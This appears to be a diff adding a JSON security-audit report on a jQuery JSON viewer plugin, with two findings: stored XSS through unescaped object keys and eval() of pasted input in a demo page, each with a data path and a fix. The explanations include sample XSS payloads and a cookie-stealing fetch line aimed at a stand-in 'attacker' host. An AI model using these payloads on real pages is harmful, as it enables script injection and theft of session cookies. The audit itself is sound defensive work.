@@ -1,0 +1,34 @@
+{
+  "findings": [
+    {
+      "file": "json-viewer/jquery.json-viewer.js",
+      "function": "json2html",
+      "line_start": 80,
+      "line_end": 87,
+      "cwe": "CWE-79",
+      "title": "Stored XSS via unescaped JSON object keys",
+      "explanation": "String *values* are HTML-escaped at lines 33-38, but object *keys* are not. At lines 80-81 the raw key is concatenated straight into the generated markup (both branches: bare at line 81/86 and inside a <span class=\"json-string\"> at line 81, and inside <a class=\"json-toggle\"> at line 84). The resulting string is handed to jQuery's $(this).html(html) at line 128, which parses it as HTML, so any markup in a key becomes live DOM in the page's origin. Verified by running the plugin with a stub jQuery: the key {\"<img src=x onerror=alert(1)>\": 1} is emitted verbatim as '<li><img src=x onerror=alert(1)>: ...' with no escaping, and a key of 'x\"><img src=x onerror=alert(1)>' with withQuotes:true breaks out of the quoted span context. Because the JSON rendered by this viewer is normally untrusted (an API response, a user-submitted document, a log record), an attacker who controls any key name in that JSON achieves arbitrary script execution against every viewer of the page. Fix: run the key through the same escaping applied to string values before interpolating it.",
+      "path": [
+        {"file": "json-viewer/jquery.json-viewer.js", "function": "$.fn.jsonViewer", "line": 122, "role": "source"},
+        {"file": "json-viewer/jquery.json-viewer.js", "function": "json2html", "line": 77, "role": "propagator"},
+        {"file": "json-viewer/jquery.json-viewer.js", "function": "json2html", "line": 80, "role": "propagator"},
+        {"file": "json-viewer/jquery.json-viewer.js", "function": "json2html", "line": 84, "role": "propagator"},
+        {"file": "json-viewer/jquery.json-viewer.js", "function": "json2html", "line": 86, "role": "propagator"},
+        {"file": "json-viewer/jquery.json-viewer.js", "function": "$.fn.jsonViewer", "line": 128, "role": "sink"}
+      ]
+    },
+    {
+      "file": "demo.html",
+      "function": "renderJson",
+      "line_start": 32,
+      "line_end": 38,
+      "cwe": "CWE-95",
+      "title": "Code injection: eval() of unparsed viewer input",
+      "explanation": "The contents of the #json-input textarea are passed to eval() wrapped in parentheses instead of being parsed with JSON.parse. Anything that is valid JavaScript is executed with the page's full privileges, e.g. supplying (alert(document.cookie)) or (function(){fetch('//attacker/'+document.cookie)}()) runs immediately; the try/catch only swallows errors and does not restrict execution. The input is attacker-controlled whenever the JSON being inspected did not originate with the person at the keyboard, which is this page's entire purpose: a 'paste this JSON to reproduce the bug' payload executes on paste-and-render, and renderJson() is also invoked automatically on page load (line 55) and on any option checkbox click (line 52). This file is additionally the repository's reference usage example, so the eval pattern propagates into consumers that feed it remote JSON, where it becomes a directly remotely-triggered code execution. Fix: use JSON.parse.",
+      "path": [
+        {"file": "demo.html", "function": "renderJson", "line": 34, "role": "source"},
+        {"file": "demo.html", "function": "renderJson", "line": 34, "role": "sink"}
+      ]
+    }
+  ]
+}
